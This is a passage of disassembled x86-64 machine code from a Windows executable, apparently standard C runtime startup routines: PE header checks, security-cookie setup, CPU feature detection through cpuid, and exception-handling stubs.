   1400033fe:	84 c0                	test   %al,%al
   140003400:	75 09                	jne    0x14000340b
   140003402:	33 c9                	xor    %ecx,%ecx
   140003404:	e8 67 09 00 00       	call   0x140003d70
   140003409:	eb ea                	jmp    0x1400033f5
   14000340b:	b0 01                	mov    $0x1,%al
   14000340d:	48 83 c4 28          	add    $0x28,%rsp
   140003411:	c3                   	ret
   140003412:	cc                   	int3
   140003413:	cc                   	int3
   140003414:	40 53                	rex push %rbx
   140003416:	48 83 ec 20          	sub    $0x20,%rsp
   14000341a:	80 3d c8 b7 01 00 00 	cmpb   $0x0,0x1b7c8(%rip)        # 0x14001ebe9
   140003421:	8b d9                	mov    %ecx,%ebx
   140003423:	75 67                	jne    0x14000348c
   140003425:	83 f9 01             	cmp    $0x1,%ecx
   140003428:	77 6a                	ja     0x140003494
   14000342a:	e8 f9 06 00 00       	call   0x140003b28
   14000342f:	85 c0                	test   %eax,%eax
   140003431:	74 28                	je     0x14000345b
   140003433:	85 db                	test   %ebx,%ebx
   140003435:	75 24                	jne    0x14000345b
   140003437:	48 8d 0d b2 b7 01 00 	lea    0x1b7b2(%rip),%rcx        # 0x14001ebf0
   14000343e:	e8 05 3c 00 00       	call   0x140007048
   140003443:	85 c0                	test   %eax,%eax
   140003445:	75 10                	jne    0x140003457
   140003447:	48 8d 0d ba b7 01 00 	lea    0x1b7ba(%rip),%rcx        # 0x14001ec08
   14000344e:	e8 f5 3b 00 00       	call   0x140007048
   140003453:	85 c0                	test   %eax,%eax
   140003455:	74 2e                	je     0x140003485
   140003457:	32 c0                	xor    %al,%al
   140003459:	eb 33                	jmp    0x14000348e
   14000345b:	66 0f 6f 05 8d d9 00 	movdqa 0xd98d(%rip),%xmm0        # 0x140010df0
   140003462:	00 
   140003463:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003467:	f3 0f 7f 05 81 b7 01 	movdqu %xmm0,0x1b781(%rip)        # 0x14001ebf0
   14000346e:	00 
   14000346f:	48 89 05 8a b7 01 00 	mov    %rax,0x1b78a(%rip)        # 0x14001ec00
   140003476:	f3 0f 7f 05 8a b7 01 	movdqu %xmm0,0x1b78a(%rip)        # 0x14001ec08
   14000347d:	00 
   14000347e:	48 89 05 93 b7 01 00 	mov    %rax,0x1b793(%rip)        # 0x14001ec18
   140003485:	c6 05 5d b7 01 00 01 	movb   $0x1,0x1b75d(%rip)        # 0x14001ebe9
   14000348c:	b0 01                	mov    $0x1,%al
   14000348e:	48 83 c4 20          	add    $0x20,%rsp
   140003492:	5b                   	pop    %rbx
   140003493:	c3                   	ret
   140003494:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003499:	e8 6a 02 00 00       	call   0x140003708
   14000349e:	cc                   	int3
   14000349f:	cc                   	int3
   1400034a0:	48 83 ec 18          	sub    $0x18,%rsp
   1400034a4:	4c 8b c1             	mov    %rcx,%r8
   1400034a7:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400034ac:	66 39 05 4d cb ff ff 	cmp    %ax,-0x34b3(%rip)        # 0x140000000
   1400034b3:	75 78                	jne    0x14000352d
   1400034b5:	48 63 0d 80 cb ff ff 	movslq -0x3480(%rip),%rcx        # 0x14000003c
   1400034bc:	48 8d 15 3d cb ff ff 	lea    -0x34c3(%rip),%rdx        # 0x140000000
   1400034c3:	48 03 ca             	add    %rdx,%rcx
   1400034c6:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400034cc:	75 5f                	jne    0x14000352d
   1400034ce:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400034d3:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400034d7:	75 54                	jne    0x14000352d
   1400034d9:	4c 2b c2             	sub    %rdx,%r8
   1400034dc:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400034e0:	48 83 c2 18          	add    $0x18,%rdx
   1400034e4:	48 03 d1             	add    %rcx,%rdx
   1400034e7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400034eb:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400034ef:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400034f3:	48 89 14 24          	mov    %rdx,(%rsp)
   1400034f7:	49 3b d1             	cmp    %r9,%rdx
   1400034fa:	74 18                	je     0x140003514
   1400034fc:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400034ff:	4c 3b c1             	cmp    %rcx,%r8
   140003502:	72 0a                	jb     0x14000350e
   140003504:	8b 42 08             	mov    0x8(%rdx),%eax
   140003507:	03 c1                	add    %ecx,%eax
   140003509:	4c 3b c0             	cmp    %rax,%r8
   14000350c:	72 08                	jb     0x140003516
   14000350e:	48 83 c2 28          	add    $0x28,%rdx
   140003512:	eb df                	jmp    0x1400034f3
   140003514:	33 d2                	xor    %edx,%edx
   140003516:	48 85 d2             	test   %rdx,%rdx
   140003519:	75 04                	jne    0x14000351f
   14000351b:	32 c0                	xor    %al,%al
   14000351d:	eb 14                	jmp    0x140003533
   14000351f:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140003523:	7d 04                	jge    0x140003529
   140003525:	32 c0                	xor    %al,%al
   140003527:	eb 0a                	jmp    0x140003533
   140003529:	b0 01                	mov    $0x1,%al
   14000352b:	eb 06                	jmp    0x140003533
   14000352d:	32 c0                	xor    %al,%al
   14000352f:	eb 02                	jmp    0x140003533
   140003531:	32 c0                	xor    %al,%al
   140003533:	48 83 c4 18          	add    $0x18,%rsp
   140003537:	c3                   	ret
   140003538:	40 53                	rex push %rbx
   14000353a:	48 83 ec 20          	sub    $0x20,%rsp
   14000353e:	8a d9                	mov    %cl,%bl
   140003540:	e8 e3 05 00 00       	call   0x140003b28
   140003545:	33 d2                	xor    %edx,%edx
   140003547:	85 c0                	test   %eax,%eax
   140003549:	74 0b                	je     0x140003556
   14000354b:	84 db                	test   %bl,%bl
   14000354d:	75 07                	jne    0x140003556
   14000354f:	48 87 15 8a b6 01 00 	xchg   %rdx,0x1b68a(%rip)        # 0x14001ebe0
   140003556:	48 83 c4 20          	add    $0x20,%rsp
   14000355a:	5b                   	pop    %rbx
   14000355b:	c3                   	ret
   14000355c:	40 53                	rex push %rbx
   14000355e:	48 83 ec 20          	sub    $0x20,%rsp
   140003562:	80 3d 7f b6 01 00 00 	cmpb   $0x0,0x1b67f(%rip)        # 0x14001ebe8
   140003569:	8a d9                	mov    %cl,%bl
   14000356b:	74 04                	je     0x140003571
   14000356d:	84 d2                	test   %dl,%dl
   14000356f:	75 0c                	jne    0x14000357d
   140003571:	e8 82 3c 00 00       	call   0x1400071f8
   140003576:	8a cb                	mov    %bl,%cl
   140003578:	e8 f3 07 00 00       	call   0x140003d70
   14000357d:	b0 01                	mov    $0x1,%al
   14000357f:	48 83 c4 20          	add    $0x20,%rsp
   140003583:	5b                   	pop    %rbx
   140003584:	c3                   	ret
   140003585:	cc                   	int3
   140003586:	cc                   	int3
   140003587:	cc                   	int3
   140003588:	40 53                	rex push %rbx
   14000358a:	48 83 ec 20          	sub    $0x20,%rsp
   14000358e:	48 83 3d 5a b6 01 00 	cmpq   $0xffffffffffffffff,0x1b65a(%rip)        # 0x14001ebf0
   140003595:	ff 
   140003596:	48 8b d9             	mov    %rcx,%rbx
   140003599:	75 07                	jne    0x1400035a2
   14000359b:	e8 54 3a 00 00       	call   0x140006ff4
   1400035a0:	eb 0f                	jmp    0x1400035b1
   1400035a2:	48 8b d3             	mov    %rbx,%rdx
   1400035a5:	48 8d 0d 44 b6 01 00 	lea    0x1b644(%rip),%rcx        # 0x14001ebf0
   1400035ac:	e8 bf 3a 00 00       	call   0x140007070
   1400035b1:	33 d2                	xor    %edx,%edx
   1400035b3:	85 c0                	test   %eax,%eax
   1400035b5:	48 0f 44 d3          	cmove  %rbx,%rdx
   1400035b9:	48 8b c2             	mov    %rdx,%rax
   1400035bc:	48 83 c4 20          	add    $0x20,%rsp
   1400035c0:	5b                   	pop    %rbx
   1400035c1:	c3                   	ret
   1400035c2:	cc                   	int3
   1400035c3:	cc                   	int3
   1400035c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400035c8:	e8 bb ff ff ff       	call   0x140003588
   1400035cd:	48 f7 d8             	neg    %rax
   1400035d0:	1b c0                	sbb    %eax,%eax
   1400035d2:	f7 d8                	neg    %eax
   1400035d4:	ff c8                	dec    %eax
   1400035d6:	48 83 c4 28          	add    $0x28,%rsp
   1400035da:	c3                   	ret
   1400035db:	cc                   	int3
   1400035dc:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400035e1:	55                   	push   %rbp
   1400035e2:	48 8b ec             	mov    %rsp,%rbp
   1400035e5:	48 83 ec 30          	sub    $0x30,%rsp
   1400035e9:	48 8b 05 10 aa 01 00 	mov    0x1aa10(%rip),%rax        # 0x14001e000
   1400035f0:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400035f7:	2b 00 00 
   1400035fa:	48 3b c3             	cmp    %rbx,%rax
   1400035fd:	75 77                	jne    0x140003676
   1400035ff:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140003603:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   14000360a:	00 
   14000360b:	ff 15 57 ca 00 00    	call   *0xca57(%rip)        # 0x140010068
   140003611:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003615:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003619:	ff 15 41 ca 00 00    	call   *0xca41(%rip)        # 0x140010060
   14000361f:	8b c0                	mov    %eax,%eax
   140003621:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140003625:	ff 15 2d ca 00 00    	call   *0xca2d(%rip)        # 0x140010058
   14000362b:	8b c0                	mov    %eax,%eax
   14000362d:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140003631:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140003635:	ff 15 15 ca 00 00    	call   *0xca15(%rip)        # 0x140010050
   14000363b:	8b 45 18             	mov    0x18(%rbp),%eax
   14000363e:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003642:	48 c1 e0 20          	shl    $0x20,%rax
   140003646:	48 33 45 18          	xor    0x18(%rbp),%rax
   14000364a:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000364e:	48 33 c1             	xor    %rcx,%rax
   140003651:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140003658:	ff 00 00 
   14000365b:	48 23 c1             	and    %rcx,%rax
   14000365e:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140003665:	2b 00 00 
   140003668:	48 3b c3             	cmp    %rbx,%rax
   14000366b:	48 0f 44 c1          	cmove  %rcx,%rax
   14000366f:	48 89 05 8a a9 01 00 	mov    %rax,0x1a98a(%rip)        # 0x14001e000
   140003676:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000367b:	48 f7 d0             	not    %rax
   14000367e:	48 89 05 bb a9 01 00 	mov    %rax,0x1a9bb(%rip)        # 0x14001e040
   140003685:	48 83 c4 30          	add    $0x30,%rsp
   140003689:	5d                   	pop    %rbp
   14000368a:	c3                   	ret
   14000368b:	cc                   	int3
   14000368c:	b8 01 00 00 00       	mov    $0x1,%eax
   140003691:	c3                   	ret
   140003692:	cc                   	int3
   140003693:	cc                   	int3
   140003694:	b8 00 40 00 00       	mov    $0x4000,%eax
   140003699:	c3                   	ret
   14000369a:	cc                   	int3
   14000369b:	cc                   	int3
   14000369c:	48 8d 0d 7d b5 01 00 	lea    0x1b57d(%rip),%rcx        # 0x14001ec20
   1400036a3:	48 ff 25 c6 c9 00 00 	rex.W jmp *0xc9c6(%rip)        # 0x140010070
   1400036aa:	cc                   	int3
   1400036ab:	cc                   	int3
   1400036ac:	b0 01                	mov    $0x1,%al
   1400036ae:	c3                   	ret
   1400036af:	cc                   	int3
   1400036b0:	c2 00 00             	ret    $0x0
   1400036b3:	cc                   	int3
   1400036b4:	48 8d 05 75 b5 01 00 	lea    0x1b575(%rip),%rax        # 0x14001ec30
   1400036bb:	c3                   	ret
   1400036bc:	48 8d 05 75 b5 01 00 	lea    0x1b575(%rip),%rax        # 0x14001ec38
   1400036c3:	c3                   	ret
   1400036c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400036c8:	e8 e7 ff ff ff       	call   0x1400036b4
   1400036cd:	48 83 08 24          	orq    $0x24,(%rax)
   1400036d1:	e8 e6 ff ff ff       	call   0x1400036bc
   1400036d6:	48 83 08 02          	orq    $0x2,(%rax)
   1400036da:	48 83 c4 28          	add    $0x28,%rsp
   1400036de:	c3                   	ret
   1400036df:	cc                   	int3
   1400036e0:	33 c0                	xor    %eax,%eax
   1400036e2:	39 05 64 a9 01 00    	cmp    %eax,0x1a964(%rip)        # 0x14001e04c
   1400036e8:	0f 94 c0             	sete   %al
   1400036eb:	c3                   	ret
   1400036ec:	48 8d 05 c5 bf 01 00 	lea    0x1bfc5(%rip),%rax        # 0x14001f6b8
   1400036f3:	c3                   	ret
   1400036f4:	48 8d 05 b5 bf 01 00 	lea    0x1bfb5(%rip),%rax        # 0x14001f6b0
   1400036fb:	c3                   	ret
   1400036fc:	c7 05 3a b5 01 00 00 	movl   $0x0,0x1b53a(%rip)        # 0x14001ec40
   140003703:	00 00 00 
   140003706:	c3                   	ret
   140003707:	cc                   	int3
   140003708:	8b c9                	mov    %ecx,%ecx
   14000370a:	cd 29                	int    $0x29
   14000370c:	c3                   	ret
   14000370d:	cc                   	int3
   14000370e:	cc                   	int3
   14000370f:	cc                   	int3
   140003710:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140003717:	33 d2                	xor    %edx,%edx
   140003719:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000371e:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   140003722:	e8 d9 b9 00 00       	call   0x14000f100
   140003727:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000372c:	ff 15 4e c9 00 00    	call   *0xc94e(%rip)        # 0x140010080
   140003732:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   140003737:	b8 0a 00 00 00       	mov    $0xa,%eax
   14000373c:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   140003742:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140003749:	c3                   	ret
   14000374a:	cc                   	int3
   14000374b:	cc                   	int3
   14000374c:	e9 5f e9 ff ff       	jmp    0x1400020b0
   140003751:	cc                   	int3
   140003752:	cc                   	int3
   140003753:	cc                   	int3
   140003754:	48 83 ec 28          	sub    $0x28,%rsp
   140003758:	33 c9                	xor    %ecx,%ecx
   14000375a:	ff 15 28 c9 00 00    	call   *0xc928(%rip)        # 0x140010088
   140003760:	48 85 c0             	test   %rax,%rax
   140003763:	74 3a                	je     0x14000379f
   140003765:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000376a:	66 39 08             	cmp    %cx,(%rax)
   14000376d:	75 30                	jne    0x14000379f
   14000376f:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140003773:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   14000377a:	75 23                	jne    0x14000379f
   14000377c:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140003781:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   140003786:	75 17                	jne    0x14000379f
   140003788:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   14000378f:	0e 
   140003790:	76 0d                	jbe    0x14000379f
   140003792:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   140003799:	00 
   14000379a:	0f 95 c0             	setne  %al
   14000379d:	eb 02                	jmp    0x1400037a1
   14000379f:	32 c0                	xor    %al,%al
   1400037a1:	48 83 c4 28          	add    $0x28,%rsp
   1400037a5:	c3                   	ret
   1400037a6:	cc                   	int3
   1400037a7:	cc                   	int3
   1400037a8:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400037b8
   1400037af:	48 ff 25 c2 c8 00 00 	rex.W jmp *0xc8c2(%rip)        # 0x140010078
   1400037b6:	cc                   	int3
   1400037b7:	cc                   	int3
   1400037b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400037bd:	57                   	push   %rdi
   1400037be:	48 83 ec 20          	sub    $0x20,%rsp
   1400037c2:	48 8b 19             	mov    (%rcx),%rbx
   1400037c5:	48 8b f9             	mov    %rcx,%rdi
   1400037c8:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400037ce:	75 1c                	jne    0x1400037ec
   1400037d0:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400037d4:	75 16                	jne    0x1400037ec
   1400037d6:	8b 53 20             	mov    0x20(%rbx),%edx
   1400037d9:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   1400037df:	83 f8 02             	cmp    $0x2,%eax
   1400037e2:	76 15                	jbe    0x1400037f9
   1400037e4:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   1400037ea:	74 0d                	je     0x1400037f9
   1400037ec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400037f1:	33 c0                	xor    %eax,%eax
   1400037f3:	48 83 c4 20          	add    $0x20,%rsp
   1400037f7:	5f                   	pop    %rdi
   1400037f8:	c3                   	ret
   1400037f9:	e8 ea 06 00 00       	call   0x140003ee8
   1400037fe:	48 89 18             	mov    %rbx,(%rax)
   140003801:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140003805:	e8 f2 06 00 00       	call   0x140003efc
   14000380a:	48 89 18             	mov    %rbx,(%rax)
   14000380d:	e8 1e 3a 00 00       	call   0x140007230
   140003812:	cc                   	int3
   140003813:	cc                   	int3
   140003814:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003819:	57                   	push   %rdi
   14000381a:	48 83 ec 20          	sub    $0x20,%rsp
   14000381e:	48 8d 1d a3 53 01 00 	lea    0x153a3(%rip),%rbx        # 0x140018bc8
   140003825:	48 8d 3d 9c 53 01 00 	lea    0x1539c(%rip),%rdi        # 0x140018bc8
   14000382c:	eb 12                	jmp    0x140003840
   14000382e:	48 8b 03             	mov    (%rbx),%rax
   140003831:	48 85 c0             	test   %rax,%rax
   140003834:	74 06                	je     0x14000383c
   140003836:	ff 15 54 ca 00 00    	call   *0xca54(%rip)        # 0x140010290
   14000383c:	48 83 c3 08          	add    $0x8,%rbx
   140003840:	48 3b df             	cmp    %rdi,%rbx
   140003843:	72 e9                	jb     0x14000382e
   140003845:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000384a:	48 83 c4 20          	add    $0x20,%rsp
   14000384e:	5f                   	pop    %rdi
   14000384f:	c3                   	ret
   140003850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003855:	57                   	push   %rdi
   140003856:	48 83 ec 20          	sub    $0x20,%rsp
   14000385a:	48 8d 1d 77 53 01 00 	lea    0x15377(%rip),%rbx        # 0x140018bd8
   140003861:	48 8d 3d 70 53 01 00 	lea    0x15370(%rip),%rdi        # 0x140018bd8
   140003868:	eb 12                	jmp    0x14000387c
   14000386a:	48 8b 03             	mov    (%rbx),%rax
   14000386d:	48 85 c0             	test   %rax,%rax
   140003870:	74 06                	je     0x140003878
   140003872:	ff 15 18 ca 00 00    	call   *0xca18(%rip)        # 0x140010290
   140003878:	48 83 c3 08          	add    $0x8,%rbx
   14000387c:	48 3b df             	cmp    %rdi,%rbx
   14000387f:	72 e9                	jb     0x14000386a
   140003881:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003886:	48 83 c4 20          	add    $0x20,%rsp
   14000388a:	5f                   	pop    %rdi
   14000388b:	c3                   	ret
   14000388c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003891:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140003896:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000389b:	57                   	push   %rdi
   14000389c:	48 83 ec 10          	sub    $0x10,%rsp
   1400038a0:	33 c0                	xor    %eax,%eax
   1400038a2:	33 c9                	xor    %ecx,%ecx
   1400038a4:	0f a2                	cpuid
   1400038a6:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   1400038ac:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   1400038b2:	0b d1                	or     %ecx,%edx
   1400038b4:	8b e8                	mov    %eax,%ebp
   1400038b6:	b8 01 00 00 00       	mov    $0x1,%eax
   1400038bb:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   1400038c1:	0b d3                	or     %ebx,%edx
   1400038c3:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1400038c6:	0f a2                	cpuid
   1400038c8:	8b f9                	mov    %ecx,%edi
   1400038ca:	75 5e                	jne    0x14000392a
   1400038cc:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1400038d1:	48 c7 05 7c a7 01 00 	movq   $0x8000,0x1a77c(%rip)        # 0x14001e058
   1400038d8:	00 80 00 00 
   1400038dc:	48 c7 05 79 a7 01 00 	movq   $0xffffffffffffffff,0x1a779(%rip)        # 0x14001e060
   1400038e3:	ff ff ff ff 
   1400038e7:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   1400038ec:	74 28                	je     0x140003916
   1400038ee:	3d 60 06 02 00       	cmp    $0x20660,%eax
   1400038f3:	74 21                	je     0x140003916
   1400038f5:	3d 70 06 02 00       	cmp    $0x20670,%eax
   1400038fa:	74 1a                	je     0x140003916
   1400038fc:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140003901:	83 f8 20             	cmp    $0x20,%eax
   140003904:	77 24                	ja     0x14000392a
   140003906:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   14000390d:	00 00 00 
   140003910:	48 0f a3 c1          	bt     %rax,%rcx
   140003914:	73 14                	jae    0x14000392a
   140003916:	44 8b 05 27 b3 01 00 	mov    0x1b327(%rip),%r8d        # 0x14001ec44
   14000391d:	41 83 c8 01          	or     $0x1,%r8d
   140003921:	44 89 05 1c b3 01 00 	mov    %r8d,0x1b31c(%rip)        # 0x14001ec44
   140003928:	eb 07                	jmp    0x140003931
   14000392a:	44 8b 05 13 b3 01 00 	mov    0x1b313(%rip),%r8d        # 0x14001ec44
   140003931:	45 33 c9             	xor    %r9d,%r9d
   140003934:	45 8b d9             	mov    %r9d,%r11d
   140003937:	83 fd 07             	cmp    $0x7,%ebp
   14000393a:	7c 42                	jl     0x14000397e
   14000393c:	33 c9                	xor    %ecx,%ecx
   14000393e:	41 8d 41 07          	lea    0x7(%r9),%eax
   140003942:	0f a2                	cpuid
   140003944:	8b f2                	mov    %edx,%esi
   140003946:	44 8b d3             	mov    %ebx,%r10d
   140003949:	0f ba e3 09          	bt     $0x9,%ebx
   14000394d:	73 0b                	jae    0x14000395a
   14000394f:	41 83 c8 02          	or     $0x2,%r8d
   140003953:	44 89 05 ea b2 01 00 	mov    %r8d,0x1b2ea(%rip)        # 0x14001ec44
   14000395a:	83 f8 01             	cmp    $0x1,%eax
   14000395d:	7c 0d                	jl     0x14000396c
   14000395f:	b8 07 00 00 00       	mov    $0x7,%eax
   140003964:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140003967:	0f a2                	cpuid
   140003969:	44 8b ca             	mov    %edx,%r9d
   14000396c:	b8 24 00 00 00       	mov    $0x24,%eax
   140003971:	3b e8                	cmp    %eax,%ebp
   140003973:	7c 0f                	jl     0x140003984
   140003975:	33 c9                	xor    %ecx,%ecx
   140003977:	0f a2                	cpuid
   140003979:	44 8b db             	mov    %ebx,%r11d
   14000397c:	eb 06                	jmp    0x140003984
   14000397e:	45 8b d1             	mov    %r9d,%r10d
   140003981:	41 8b f1             	mov    %r9d,%esi
   140003984:	48 8b 05 dd a6 01 00 	mov    0x1a6dd(%rip),%rax        # 0x14001e068
   14000398b:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   14000398f:	c7 05 b7 a6 01 00 01 	movl   $0x1,0x1a6b7(%rip)        # 0x14001e050
   140003996:	00 00 00 
   140003999:	c7 05 b1 a6 01 00 02 	movl   $0x2,0x1a6b1(%rip)        # 0x14001e054
   1400039a0:	00 00 00 
   1400039a3:	48 89 05 be a6 01 00 	mov    %rax,0x1a6be(%rip)        # 0x14001e068
   1400039aa:	0f ba e7 14          	bt     $0x14,%edi
   1400039ae:	73 1f                	jae    0x1400039cf
   1400039b0:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   1400039b4:	c7 05 92 a6 01 00 02 	movl   $0x2,0x1a692(%rip)        # 0x14001e050
   1400039bb:	00 00 00 
   1400039be:	48 89 05 a3 a6 01 00 	mov    %rax,0x1a6a3(%rip)        # 0x14001e068
   1400039c5:	c7 05 85 a6 01 00 06 	movl   $0x6,0x1a685(%rip)        # 0x14001e054
   1400039cc:	00 00 00 
   1400039cf:	0f ba e7 1b          	bt     $0x1b,%edi
   1400039d3:	0f 83 37 01 00 00    	jae    0x140003b10
   1400039d9:	33 c9                	xor    %ecx,%ecx
   1400039db:	0f 01 d0             	xgetbv
   1400039de:	48 c1 e2 20          	shl    $0x20,%rdx
   1400039e2:	48 0b d0             	or     %rax,%rdx
   1400039e5:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400039ea:	0f ba e7 1c          	bt     $0x1c,%edi
   1400039ee:	0f 83 00 01 00 00    	jae    0x140003af4
   1400039f4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400039f9:	24 06                	and    $0x6,%al
   1400039fb:	3c 06                	cmp    $0x6,%al
   1400039fd:	0f 85 f1 00 00 00    	jne    0x140003af4
   140003a03:	8b 05 4b a6 01 00    	mov    0x1a64b(%rip),%eax        # 0x14001e054
   140003a09:	b2 e0                	mov    $0xe0,%dl
   140003a0b:	83 c8 08             	or     $0x8,%eax
   140003a0e:	c7 05 38 a6 01 00 03 	movl   $0x3,0x1a638(%rip)        # 0x14001e050
   140003a15:	00 00 00 
   140003a18:	89 05 36 a6 01 00    	mov    %eax,0x1a636(%rip)        # 0x14001e054
   140003a1e:	41 f6 c2 20          	test   $0x20,%r10b
   140003a22:	74 62                	je     0x140003a86
   140003a24:	83 c8 20             	or     $0x20,%eax
   140003a27:	c7 05 1f a6 01 00 05 	movl   $0x5,0x1a61f(%rip)        # 0x14001e050
   140003a2e:	00 00 00 
   140003a31:	89 05 1d a6 01 00    	mov    %eax,0x1a61d(%rip)        # 0x14001e054
   140003a37:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140003a3c:	48 8b 05 25 a6 01 00 	mov    0x1a625(%rip),%rax        # 0x14001e068
   140003a43:	44 23 d1             	and    %ecx,%r10d
   140003a46:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140003a4a:	48 89 05 17 a6 01 00 	mov    %rax,0x1a617(%rip)        # 0x14001e068
   140003a51:	44 3b d1             	cmp    %ecx,%r10d
   140003a54:	75 37                	jne    0x140003a8d
   140003a56:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003a5b:	22 c2                	and    %dl,%al
   140003a5d:	3a c2                	cmp    %dl,%al
   140003a5f:	75 25                	jne    0x140003a86
   140003a61:	48 8b 05 00 a6 01 00 	mov    0x1a600(%rip),%rax        # 0x14001e068
   140003a68:	83 0d e5 a5 01 00 40 	orl    $0x40,0x1a5e5(%rip)        # 0x14001e054
   140003a6f:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140003a73:	c7 05 d3 a5 01 00 06 	movl   $0x6,0x1a5d3(%rip)        # 0x14001e050
   140003a7a:	00 00 00 
   140003a7d:	48 89 05 e4 a5 01 00 	mov    %rax,0x1a5e4(%rip)        # 0x14001e068
   140003a84:	eb 07                	jmp    0x140003a8d
   140003a86:	48 8b 05 db a5 01 00 	mov    0x1a5db(%rip),%rax        # 0x14001e068
   140003a8d:	0f ba e6 17          	bt     $0x17,%esi
   140003a91:	73 0c                	jae    0x140003a9f
   140003a93:	48 0f ba f0 18       	btr    $0x18,%rax
   140003a98:	48 89 05 c9 a5 01 00 	mov    %rax,0x1a5c9(%rip)        # 0x14001e068
   140003a9f:	41 0f ba e1 13       	bt     $0x13,%r9d
   140003aa4:	73 4e                	jae    0x140003af4
   140003aa6:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003aab:	22 c2                	and    %dl,%al
   140003aad:	3a c2                	cmp    %dl,%al
   140003aaf:	75 43                	jne    0x140003af4
   140003ab1:	48 8b 15 b0 a5 01 00 	mov    0x1a5b0(%rip),%rdx        # 0x14001e068
   140003ab8:	41 8b c3             	mov    %r11d,%eax
   140003abb:	48 c1 e8 10          	shr    $0x10,%rax
   140003abf:	41 8b cb             	mov    %r11d,%ecx
   140003ac2:	83 e0 06             	and    $0x6,%eax
   140003ac5:	81 e1 ff 00 04 00    	and    $0x400ff,%ecx
   140003acb:	48 0d 29 00 00 01    	or     $0x1000029,%rax
   140003ad1:	89 0d 71 b1 01 00    	mov    %ecx,0x1b171(%rip)        # 0x14001ec48
   140003ad7:	48 f7 d0             	not    %rax
   140003ada:	48 23 d0             	and    %rax,%rdx
   140003add:	48 89 15 84 a5 01 00 	mov    %rdx,0x1a584(%rip)        # 0x14001e068
   140003ae4:	80 f9 01             	cmp    $0x1,%cl
   140003ae7:	76 0b                	jbe    0x140003af4
   140003ae9:	48 83 e2 bf          	and    $0xffffffffffffffbf,%rdx
   140003aed:	48 89 15 74 a5 01 00 	mov    %rdx,0x1a574(%rip)        # 0x14001e068
   140003af4:	41 0f ba e1 15       	bt     $0x15,%r9d
   140003af9:	73 15                	jae    0x140003b10
